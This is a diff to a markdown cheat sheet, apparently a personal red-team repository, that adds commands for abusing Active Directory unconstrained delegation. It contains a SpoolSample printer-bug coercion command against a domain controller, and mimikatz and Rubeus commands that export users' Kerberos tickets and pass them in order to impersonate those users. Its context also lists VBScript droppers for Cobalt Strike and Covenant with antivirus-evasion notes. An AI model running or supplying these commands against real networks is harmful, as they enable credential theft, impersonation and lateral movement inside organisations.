@@ -4,10 +4,26 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
 
+* [Unconstrained Delegation](#unconstrained-delegation)
+	* [Printer Bug](#printer-bug)
+	* [Extract TGTs](#extract-tgt]
 * [Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
 * [File Transfer](#file-transfer)
+
+## Unconstrained Delegation
+### Printer Bug
+```
+spoolsample.exe dc01.contoso.local ms01.contoso.local
+```
+
+## Extract TGT
+Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
+```
+mimikatz# sekurlsa::tickets /export
+Rubeus.exe ptt /ticket:ticket.kirbi
+```
 
 ## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
